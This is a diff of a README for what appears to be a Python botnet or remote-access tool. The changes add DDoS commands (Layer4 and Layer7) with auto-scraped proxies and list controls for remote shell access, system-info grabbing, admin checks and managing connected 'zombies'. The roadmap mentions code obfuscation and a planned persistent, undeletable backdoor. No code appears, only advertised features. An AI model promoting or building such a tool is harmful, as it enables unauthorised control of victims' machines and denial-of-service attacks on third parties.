@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://img.shields.io/badge/version-1.1.0-blue.svg?cacheSeconds=2592000" >
+  <img src="https://img.shields.io/badge/version-1.2.0-blue.svg?cacheSeconds=2592000" >
   <img src="https://img.shields.io/badge/Maintained%3F-yes-green.svg" >
   <!-- <img src="https://img.shields.io/badge/license-MIT-yellow.svg" > -->
   <img src="https://img.shields.io/github/last-commit/Callumgm/ISO">
@@ -58,15 +58,45 @@ Eachd command has been created in mind to stop all crashes and unexpected fails 
 
 ## <a id="commands"></a>:gear: 〢 Commands ##
 
-```shell
-> Change GUI Colors
-> Check if client is running payload as admin
-> Grab infomation about the target machine
-> Clear the console
-> Gain shell access to execute any shell/cmd command
-> List all connected zombies
-> Exit the server
-> Kill client
+
+```
+DDOS (Layer4 & Layer7)  - Gain shell access
+```
+<!--  -->
+```
+Gain shell access       - Gain shell access
+```
+<!--  -->
+```
+List Connected          - List all connected zombies
+```
+<!--  -->
+```
+Grab sysinfo            - Grab system information
+```
+<!--  -->
+```
+Admin Check             - Check if client is running payload as admin
+```
+<!--  -->
+```
+Kill Client             - Stop running payload on target machine
+```
+<!--  -->
+```
+Set Colors              - Set the colors of the GUI
+```
+<!--  -->
+```
+Clear                   - Clears the console
+```
+<!--  -->
+```
+Exit                    - Exit the program
+```
+<!--  -->
+```
+help                    - Display help command
 ```
 
 ## <a id="requirements"></a>:white_check_mark: 〢 Requirements ##
@@ -78,6 +108,7 @@ Before starting :checkered_flag:, you are required to have [Python 3.8 - 3.9](ht
 
 - [x] Clean builder and obfusecate the code before compliling
 - [x] Add network attack commands and network scanner
+- [x] Add ddos commands (Layer4 | Layer7)
 - [ ] Maybe remote import the client commands
 - [ ] Client will backdoor itself into the target machine making the payload run on startup and undeleteable
 
@@ -85,6 +116,10 @@ Before starting :checkered_flag:, you are required to have [Python 3.8 - 3.9](ht
 ## <a id="changelog"></a>:thought_balloon: 〢 Change Log ##
 
 ```diff
+v1.2.0 ⋮ 2022-09-26
++ Added ddos commands (Layer4 | Layer7)
++ Added auto scrape proxies for ddos commands
+
 v1.1.0 ⋮ 2022-09-22
 + Added network scanner & attack commands
 
